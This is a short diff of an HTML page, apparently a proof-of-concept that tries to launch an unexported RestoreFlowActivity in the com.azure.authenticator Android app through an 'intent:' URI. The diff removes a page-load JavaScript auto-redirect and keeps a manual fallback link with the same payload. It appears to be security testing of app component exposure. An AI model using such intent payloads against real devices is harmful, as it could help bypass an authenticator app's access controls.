@@ -7,10 +7,6 @@
     <h1>Executing Internal Intent...</h1>
     
     <!-- This tries to launch the unexported RestoreFlowActivity -->
-    <script>
-        // We use JavaScript to automatically click the link as soon as the page loads
-        window.location.href = "intent:#Intent;component=com.azure.authenticator/com.azure.authenticator.ui.backup.RestoreFlowActivity;end";
-    </script>
     
     <!-- A manual fallback link just in case JS auto-redirect is blocked -->
     <a href="intent:#Intent;component=com.azure.authenticator/com.azure.authenticator.ui.backup.RestoreFlowActivity;end">Click here to launch RestoreFlow</a>
